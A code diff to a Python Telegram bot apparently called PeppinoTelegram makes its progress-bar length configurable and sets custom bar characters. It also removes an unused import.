@@ -49,7 +49,6 @@ from io import BytesIO, StringIO
 from random import choice, randint
 from string import ascii_letters, printable
 from webbrowser import open as browseropen
-from platform import system as platform_system
 from os.path import join, abspath, isfile, isdir
 from os import system, remove, getenv, getcwd, listdir, name, mkdir 
 from keyboard import press as press_key, release as release_key, read_event, KEY_DOWN
@@ -423,7 +422,7 @@ all_spinners = {
 }
 
 class LoadingBar:
-    def __init__(self, total: int, chat_id: int, bot: Bot, autosend: bool=True, autodelete: bool=True, showperc: bool=True, label=None, spinner_enabled: bool=True, full_char: str="🔲", empty_char="🔶", spinner_frames=all_spinners["braille"], spinner_pos: str="left"):
+    def __init__(self, total: int, chat_id: int, bot: Bot, autosend: bool=True, autodelete: bool=True, showperc: bool=True, label=None, spinner_enabled: bool=True, full_char: str="🔲", empty_char="🔶", spinner_frames=all_spinners["braille"], spinner_pos: str="left", bar_lenght: int=10):
         self.bot = bot
         self.tot = total
         self.label = label
@@ -444,7 +443,7 @@ class LoadingBar:
         self.progress = 0
         self.done = False
         self.deleted = False
-        self.bar_lenght = 10
+        self.bar_lenght = bar_lenght
 
         self.bar = self.get_bar()
 
@@ -659,7 +658,7 @@ class PeppinoTelegram:
         return EditableMessage(self.bot, self.owner_id, content, autosend)
     
     def new_loading_bar(self, total: int, autodelete: bool=False, showperc:bool=False, label=None) -> LoadingBar:
-        return LoadingBar(total, self.owner_id, self.bot, autodelete=autodelete, showperc=showperc, label=label, full_char=self.loading_bar_set[0], empty_char=self.loading_bar_set[1], spinner_frames=self.loading_bar_spinner, spinner_pos="right") 
+        return LoadingBar(total, self.owner_id, self.bot, autodelete=autodelete, showperc=showperc, label=label, full_char=self.loading_bar_set[0], empty_char=self.loading_bar_set[1], spinner_frames=self.loading_bar_spinner, spinner_pos="right", bar_lenght=10) 
     
     def new_menu(self, menu: dict[str:Any], autosend: bool=True, label: str="Choose an option: ", page: int=0, next_btn: bool=False, next_btn_lab: str="next_page", prev_btn_lab: str="previus_page", close_btn_lab: str="close_page", rows=2) -> ButtonsMenu:
         return ButtonsMenu(self.owner_id, self.bot, menu, label, autosend, page=page, next_btn=next_btn, next_btn_lab=next_btn_lab, prev_btn_lab=prev_btn_lab, close_btn_lab=close_btn_lab, keyboard_rows=rows)
@@ -1247,5 +1246,5 @@ if __name__ == "__main__":
     token, chat_id = getCred() 
     mixer = CustomMixer()
     capture = VideoCapture(0)
-    pep2 = PeppinoTelegram(token,chat_id,mixer,capture,loading_bar_spinner=all_spinners["circle_dots"])
+    pep2 = PeppinoTelegram(token,chat_id,mixer,capture,loading_bar_set=["█","░"],loading_bar_spinner=all_spinners["circle_dots"])
     pep2.start()
